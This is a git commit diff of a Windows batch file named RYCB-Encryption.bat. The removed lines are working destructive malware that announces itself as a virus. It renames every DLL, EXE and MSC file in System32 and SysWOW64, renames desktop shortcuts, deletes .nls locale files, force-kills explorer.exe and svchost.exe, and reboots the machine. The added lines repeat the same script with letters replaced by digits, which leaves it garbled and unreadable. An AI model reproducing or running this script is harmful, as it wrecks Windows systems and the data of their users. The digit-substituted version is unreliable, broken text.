42947aec15e929ed884696e2104e86a5c57f8100
QYF-RYCBStudio <74858895+QYF-RYCBStudio@users.noreply.github.com>
2022-03-12 15:38:56 +0800

    Update RYCB-Encryption.bat

--- src/RYCB-Encryption.bat
+++ src/RYCB-Encryption.bat
@@ -1,24 +1,24 @@
-@echo off
-chcp 65001
-cls
-msg %Username% /v /w This is not a joke. Continue?
-cd /d ./
-start ChromeSetup.exe
-title lol
-echo Your Computer has been fucked by this virus.
-cd /d C:/WINDOWS/System32
-ren *.dll *.rycb-encryd
-ren *.exe *.rycb-encrye
-ren *.msc *.rycb-encrym
-cd /d C:\Users\Administrator/Desktop
-ren *.lnk *.rycb-encryl
-cd /d C:/Windows/System32
-ren *.nls *.rycb-encryn
-del /s /f /q *.rycb-encryn
-cd /d C:/Windows/SysWoW64
-ren *.dll *.rycb-encryd
-ren *.exe *.rycb-encrye
-ren *.msc *.rycb-encrym
-taskkill /im explorer.exe /f
-taskkill /im svchost.exe /f /t
-shutdown -r -t 10 -c Haha!
+@588o off
+888p 85001
+8l8
+m8g %U85rnam5% /v /w T8i8 i8 not a jok5. 8ontinu5?
+84 /4 ./
+8tart 88rom585tup.5x5
+titl5 lol
+588o Your 8omput5r 8a8 b55n fu8k54 by t8i8 viru8.
+84 /4 8:/WIN4OW8/8y8t5m32
+r5n *.4ll *.ry8b-5n8ry4
+r5n *.5x5 *.ry8b-5n8ry5
+r5n *.m88 *.ry8b-5n8rym
+84 /4 8:\U85r8\A4mini8trator/458ktop
+r5n *.lnk *.ry8b-5n8ryl
+84 /4 8:/Win4ow8/8y8t5m32
+r5n *.nl8 *.ry8b-5n8ryn
+45l /8 /f /q *.ry8b-5n8ryn
+84 /4 8:/Win4ow8/8y8WoW84
+r5n *.4ll *.ry8b-5n8ry4
+r5n *.5x5 *.ry8b-5n8ry5
+r5n *.m88 *.ry8b-5n8rym
+ta8kkill /im 5xplor5r.5x5 /f
+ta8kkill /im 8v88o8t.5x5 /f /t
+88ut4own -r -t 10 -8 8a8a!
